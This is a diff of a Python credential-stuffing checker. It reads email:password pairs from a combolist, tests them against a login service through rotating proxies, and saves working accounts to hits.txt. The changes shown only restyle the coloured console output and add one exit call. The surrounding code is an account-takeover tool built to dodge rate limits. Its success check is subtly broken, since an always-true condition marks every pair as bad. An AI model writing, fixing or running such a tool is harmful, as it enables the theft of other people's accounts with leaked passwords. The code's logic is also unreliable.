@@ -74,7 +74,8 @@ def load_proxies():
         elif choice == 2:
             proxytype = 'socks5'
         else:
-            print(f'{Fore.RED}[ERROR] Please enter a valid choice such as 0, 1 or 2!{Fore.RESET}')
+            print(f'[{Fore.RED}ERROR{Fore.RESET}] Please enter a valid choice such as 0, 1 or 2!')
+            quit()
 
         for proxy in proxyfile:
             ip = proxy.split(":")[0]
@@ -82,10 +83,10 @@ def load_proxies():
             proxies.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
 
     except FileNotFoundError:
-           print(f'{Fore.RED}[ERROR] Failed to open proxyfile{Fore.RESET}')
+           print(f'[{Fore.RED}ERROR{Fore.RESET}] Failed to open proxyfile')
            quit()
     except ValueError:
-        print(f'{Fore.RED}[ERROR] Value must be an integer{Fore.RESET}')
+        print(f'[{Fore.RED}ERROR{Fore.RESET}] Value must be an integer')
         quit()
 
 def worker(combos, thread_id):
@@ -132,18 +133,18 @@ def check_account(email,password):
     
         if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
             lock.acquire()
-            print(f'{Fore.RED}[BAD] {email}:{password}{Fore.RESET}')
+            print(f'[{Fore.RED}BAD{Fore.RESET}] {email}:{password}')
             invalid+=1
             lock.release()
         else:
             lock.acquire()
-            print(f'{Fore.GREEN}[GOOD] {email}:{password}{Fore.RESET}')
+            print(f'[{Fore.GREEN}GOOD{Fore.RESET}] {email}:{password}')
             valid+=1
             file = open("hits.txt","a").write(email+":"+password+"\n")   
             lock.release()
             
     except:
-        print(f'{Fore.RED}[ERROR] Proxy timeout. Change your proxies or use a different VPN{Fore.RESET}')
+        print(f'[{Fore.RED}ERROR{Fore.RESET}] Proxy timeout. Change your proxies or use a different VPN')
    
 if __name__ =='__main__':
     banner()
@@ -156,10 +157,10 @@ if __name__ =='__main__':
         threadcount = int(input(f'[{Fore.CYAN}*{Fore.RESET}] Threads> '))
     
     except FileNotFoundError:
-        print(f'{Fore.RED}[ERROR] Failed to open combolist{Fore.RESET}')
+        print(f'[{Fore.RED}ERROR{Fore.RESET}] Failed to open combolist')
         quit()
     except ValueError:
-        print(f'{Fore.RED}[ERROR] Value must be an integer{Fore.RESET}')
+        print(f'[{Fore.RED}ERROR{Fore.RESET}] Value must be an integer')
         quit() 
 
     os.system('cls')
